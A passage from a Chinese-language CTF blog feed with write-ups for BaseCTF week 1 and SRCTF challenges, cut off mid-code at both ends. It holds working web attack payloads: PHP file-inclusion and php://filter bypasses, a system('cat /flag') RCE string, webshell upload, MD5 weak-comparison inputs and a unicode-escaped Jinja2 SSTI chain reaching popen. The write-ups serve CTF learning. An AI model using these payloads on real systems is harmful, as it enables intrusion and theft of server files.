class="literal">True</span>:</span><br><span class="line">    res = req.post(url=url,data=&#123;<span class="string">&quot;answer&quot;</span>:answer&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Base&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 正则匹配</span></span><br><span class="line">    search = <span class="string">&quot;(\d*)(.)(\d*)(\?)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(search,res.text)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) + <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) - <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;×&quot;</span>:</span><br><span class="line">        answer =<span class="built_in">int</span>( <span class="keyword">match</span>.group(<span class="number">1</span>)) * <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">match</span>.group(<span class="number">2</span>) == <span class="string">&quot;÷&quot;</span>:</span><br><span class="line">        answer = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)) //<span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>推荐一个正则匹配网站，可以看到匹配效果：<a href="https://regex101.com/">https://regex101.com/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF wp(week1)</title>
      <link href="/2024/09/04/BaseCTF_week1/"/>
      <url>/2024/09/04/BaseCTF_week1/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h3><p>前端源码有flag</p><h3 id="HTTP是什么呀"><a href="#HTTP是什么呀" class="headerlink" title="HTTP是什么呀"></a>HTTP是什么呀</h3><p><img src="/2024/09/04/BaseCTF_week1/1.png" alt="图片"></p><p>得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">QmFzZUNURns4Yzk4MWY0Ny01ZWIwLTQ0ZmMtODJhMy0zZDc5ZDQ4YTlkMWF9Cg</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>base64解码即可得flag</p><h3 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Aura 酱，欢迎回家~</span></span><br><span class="line"><span class="comment">// 这里有一份礼物，请你签收一下哟~</span></span><br><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span></span><br><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>); 这是 Aura 的礼物，你不是 Aura！</span><br></pre></td></tr></table></figure><p>对源码分析，是包含三个判断的文件包含漏洞</p><p>对于第一个判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pen&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pen</span>) !== <span class="string">&#x27;Aura&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用data伪协议绕过</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">url</span>?pen=<span class="class"><span class="keyword">data</span>://text/plain,<span class="type">Aura</span></span></span><br></pre></td></tr></table></figure><p>第二个判断和第三个判断是同一个参数，合并在一起</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$challenge</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里可以看到challenge既要满足http:<span class="regexp">//</span>jasmineaura.github.io开头，</span><br><span class="line">又要包含中文<span class="string">&quot;已经收到Kengwang的礼物啦&quot;</span>，</span><br><span class="line">仅仅通过data伪协议已经无法满足条件，</span><br><span class="line">所以我们这里使用<span class="variable">@拼</span>接，</span><br><span class="line">在服务器对url解析过程中http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>和http:<span class="regexp">//</span>jasmineaura.github.io<span class="variable">@127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>效果是一样的，</span><br></pre></td></tr></table></figure><p>具体原因参考以下文章：<a href="https://www.freebuf.com/vuls/321535.html">https://www.freebuf.com/vuls/321535.html</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">post</span>传递：challenge=<span class="keyword">http</span>://jasmineaura.github.io@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?pen=data:<span class="regexp">//</span>text/plain,Aura</span><br><span class="line">post: challenge=http:<span class="regexp">//</span>jasmineaura.github.io@<span class="number">127.0</span>.<span class="number">0.1</span>&amp;gift=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h3><p>普通的rce</p><p>payload:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?DT=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>无过滤文件上传</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823140250827.png"></p><p>文件路径是&#x2F;uploads，上传成功之后直接连接蚁剑即可</p><h3 id="MD5绕过欸"><a href="#MD5绕过欸" class="headerlink" title="MD5绕过欸"></a>MD5绕过欸</h3><p>简单的md5绕过，贴上最常见的弱比较绕过（0e开头）</p><p>md5弱碰撞</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e215962017</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?<span class="attribute">name</span>=QNKCDZO&amp;name2[]=1</span><br><span class="line">post:<span class="attribute">password</span>=s214587387a&amp;password2[]=2</span><br></pre></td></tr></table></figure><h3 id="Happy-Birthday"><a href="#Happy-Birthday" class="headerlink" title="Happy Birthday"></a>Happy Birthday</h3><p>原题，上传文件发现需要pdf后缀，上传pdf文件发现需要两个文件一起上传，并且要求md5值一样</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823150344567.png"></p><p>将两个写有md5弱比较字符串（md5处理后以0e开头）的分别写入两个文件中，并且改写后缀为pdf，即可获得flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823150600204.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>basecrak工具梭哈</p><h3 id="根本进不去啊！"><a href="#根本进不去啊！" class="headerlink" title="根本进不去啊！"></a>根本进不去啊！</h3><p>网页访问不了，我们可以查询该域名的解析，使用如下linux命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dig </span>flag.<span class="keyword">basectf.fun </span>txt</span><br></pre></td></tr></table></figure><p><img src="/2024/09/04/BaseCTF_week1/image-20240823153236692.png"></p><p>也可借用在线工具：<a href="https://tool.lu/dns/index.html">https://tool.lu/dns/index.html</a></p><h3 id="你也喜欢圣物吗？"><a href="#你也喜欢圣物吗？" class="headerlink" title="你也喜欢圣物吗？"></a>你也喜欢圣物吗？</h3><p>解压发现压缩包需要密码解压，我们唯一的信息就是图片，打开010editor查看图片没有发现有效信息，于是猜想是LSB图片隐写，尝试最经典的红绿蓝三原色最低位隐写，使用Stegsolve打开查看</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823154556566.png"></p><p>得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">key</span><span class="operator">=</span>lud1_lud1</span><br></pre></td></tr></table></figure><p>解压后发现是it is fake.zip，猜测是zip伪加密，使用Winhex修改压缩包的hex编码，将红框位置修改为偶数即可将zip伪加密状态解除</p><img src="/2024/09/04/BaseCTF_week1/Users\ASUS\Desktop\base\img\image-20240823160459730.png" alt="image-20240823160459730" style="zoom: 80%;"><p>最后使用Bandizip打开flag.txt，滚动到最下面即为flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823160542649.png" alt="image-20240823160542649"></p><p>两次base64解码即可获得flag</p><h3 id="倒计时-海报"><a href="#倒计时-海报" class="headerlink" title="倒计时? 海报!"></a>倒计时? 海报!</h3><p>每张海报上面都有flag的一段，只需要仔细看就可以拼凑出来，这里我看不出来，是看了wp才知道用ps对图片进行处理，方便查看</p><img src="/2024/09/04/BaseCTF_week1/image-20240823161430721.png" alt="image-20240823161430721" style="zoom: 67%;"><h3 id="海上遇到了鲨鱼"><a href="#海上遇到了鲨鱼" class="headerlink" title="海上遇到了鲨鱼"></a>海上遇到了鲨鱼</h3><p>用wireshark流量分析，追踪http流即可找到flag</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823162538242.png"></p><p>手打flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;15ef386b-a3a7-<span class="number">7344</span>-<span class="number">3b05</span>-ac367316fb76&#125;</span><br></pre></td></tr></table></figure><h3 id="正着看还是反着看"><a href="#正着看还是反着看" class="headerlink" title="正着看还是反着看"></a>正着看还是反着看</h3><p>通过010editor打开查看图片，发现图片文件字节末尾有明显的JFIF特征，所以我们可以通过以下脚本来对图片文件字符进行逆序处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_bytes_in_file</span>(<span class="params">input_file_path, output_file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">            content = infile.read()</span><br><span class="line">            reversed_content = content[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">                outfile.write(reversed_content)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件内容已成功逆序，并写入到 <span class="subst">&#123;output_file_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未找到文件: <span class="subst">&#123;input_file_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;./flag&#x27;</span> <span class="comment">#要处理的文件名</span></span><br><span class="line">output_file = <span class="string">&#x27;./out&#x27;</span> <span class="comment">#处理完的文件名</span></span><br><span class="line">reverse_bytes_in_file(input_file, output_file)</span><br></pre></td></tr></table></figure><p>处理完之后看下结果，可以看到出现PK字节，明显具有压缩包特征</p><p><img src="/2024/09/04/BaseCTF_week1/image-20240823185638530.png"></p><p>我们使用kali工具binwalk进行文件分离，即可得到flag</p><img src="/2024/09/04/BaseCTF_week1/image-20240823185751979.png" alt="image-20240823185751979" style="zoom:50%;"><h3 id="二维码1-街头小广告"><a href="#二维码1-街头小广告" class="headerlink" title="二维码1-街头小广告"></a>二维码1-街头小广告</h3><p>使用QR Research梭哈</p><img src="/2024/09/04/BaseCTF_week1/image-20240823201437242.png" alt="image-20240823201437242" style="zoom:67%;">]]></content>
      
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRCTF wp</title>
      <link href="/2024/08/18/SRCTF/"/>
      <url>/2024/08/18/SRCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>考察简单的http请求头知识，具体要求为get传入参数flag&#x3D;1，post传入参数flag&#x3D;1;<br>伪造本地ip的时候可以利用burpsuite爆破，题目下面会附上字典，这里用的是Client-IP:127.0.0.1<br>接着题目提示加入User-Agent: Android和Referer:zzz.mihoyo.com<br>接着是一个新的知识点，如下图<br><img src="/2024/08/18/SRCTF/1.png" alt="图片"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">isset(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]);</span><br><span class="line">//<span class="variable">$_SERVER</span>是一个超全局数组，包含了请求头和服务器信息等信息</span><br><span class="line">//<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AAA&#x27;</span>]代表了http请求中名为AAA头的值</span><br></pre></td></tr></table></figure><p>根据以上分析，我们只需在请求中添加名为AAA的请求头即可<img src="/2024/08/18/SRCTF/2.png" alt="在这里插入图片描述"></p><p>接着根据提示加上Cookie:xxx&#x3D;1，即可得到flag<br><img src="/2024/08/18/SRCTF/3.png" alt="在这里插入图片描述"></p><h2 id="flag复读机"><a href="#flag复读机" class="headerlink" title="flag复读机"></a>flag复读机</h2><p>上来一个输入框，看到大括号瞬间就可以反应过来是ssti，手打一下，这是最笨的方法</p><img src="/2024/08/18/SRCTF/image-20240829160846524.png" alt="image-20240829160846524" style="zoom: 67%;"><p>fuzz测测它过滤了啥（下图为测试结果）</p><img src="/2024/08/18/SRCTF/image-20240829161007052.png" alt="image-20240829161007052" style="zoom: 80%;"><p>长为205的全是被过滤的，看起来过滤得挺多，但是attr()内置函数和单引号还有管道符没被过滤，那就试试unicode编码绕过（该绕过方式可以解决过滤点和下划线的问题）</p><p>附上unicode编码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class_name = <span class="string">&quot;&quot;</span> <span class="comment">#需要编码的类名和方法</span></span><br><span class="line">unicode_class_name = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\u&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> class_name])</span><br><span class="line"><span class="built_in">print</span>(unicode_class_name)</span><br></pre></td></tr></table></figure><p>造个paylaod，试试水先</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"><span class="comment">#相当于&#123;&#123;&quot;&quot;.__class__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161214569.png" alt="image-20240829161214569"></p><p>构造成功，说明思路是对的</p><p>继续构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>))%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f解码出来就是__base__</span></span><br><span class="line"><span class="comment">#整个paylaod相当于&#123;&#123;&quot;&quot;.__class__.__base__&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161315769.png" alt="image-20240829161315769"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(0)相当于.__base__[0]</span></span><br><span class="line"><span class="comment">#attr(&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;)()相当于.__subclasses__()</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161416177.png" alt="image-20240829161416177"></p><p>通过脚本(本题后面会贴上python找类脚本)找到&lt;os._wrap_close&gt;类在137的位置上，继续构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>))%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161559785.png" alt="image-20240829161559785"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u006c\u0073\u0020\u002f&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829161621737.png" alt="image-20240829161621737"></p><p>最终payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;%<span class="built_in">print</span>((()|attr(<span class="string">&#x27;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>(<span class="number">0</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#x27;</span>)()|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="number">137</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>)|attr(<span class="string">&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;</span>)(<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;</span>))[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#|attr(&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;)|attr(&#x27;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#x27;)(&#x27;po&#x27;&#x27;pen&#x27;)(&#x27;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&#x27;))[&#x27;read&#x27;]()相当于.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()</span></span><br><span class="line"><span class="comment">#popen被过滤，可用&#x27;po&#x27;&#x27;open&#x27;绕过</span></span><br><span class="line"><span class="comment">#同时/被过滤，将命令cat /flag编码绕过</span></span><br><span class="line"><span class="comment">#由于点被过滤.read()方法无法表达，用()将.read方法包括的范围装在一起，并且通过[&#x27;read&#x27;]绕过对</span></span><br><span class="line">点的过滤，即a[<span class="string">&#x27;read&#x27;</span>]()等效为a.read()</span><br></pre></td></tr></table></figure><p>ssti找类脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 